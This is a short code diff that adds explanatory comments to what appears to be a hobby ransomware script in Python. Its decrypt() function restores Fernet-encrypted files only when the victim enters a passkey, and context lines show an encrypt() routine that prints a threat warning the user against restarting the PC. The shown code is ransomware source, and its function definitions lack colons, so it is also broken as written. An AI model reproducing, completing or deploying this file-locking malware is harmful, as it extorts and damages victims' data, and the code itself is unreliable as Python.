@@ -48,7 +48,9 @@ def encrypt()
     print("And if you try to restart your Pc its not decryptabel too")
 
 def decrypt()
+    #asks for the password
     code = input("Enter the password: ")
+    #if rigth the files get decrypted
     if code == passkey:
         for file in files:
             with open(file, "rb") as thefile:
@@ -56,6 +58,7 @@ def decrypt()
             contents_decrypted = Fernet(secretkey).decrypt(contents)
             with open(file, "wb") as thefile:
                 thefile.write(contents_decrypted)
+    #if not they dont
     else:
         print("That was Wrong, Sorry Bro")
         
